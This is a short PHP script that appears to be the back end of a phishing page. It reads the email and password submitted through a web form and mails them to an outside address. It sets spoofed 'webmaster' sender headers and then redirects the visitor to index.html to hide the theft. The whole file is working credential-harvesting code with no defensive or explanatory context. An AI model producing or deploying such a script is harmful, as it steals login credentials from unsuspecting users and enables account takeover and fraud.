<?php
    $to      = 'noreply@fane-x.xyz';
    $subject = 'Details';
        //set message as email and password
    $message = 'Email: ' . $_POST['email'] . ' Password: ' . $_POST['password'];
    $headers = 'From: webmaster@example.com'       . "\r\n" .
                'Reply-To: webmaster@example.com' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();
    mail($to, $subject, $message, $headers);
    //send to page
    header('Location: index.html');

?>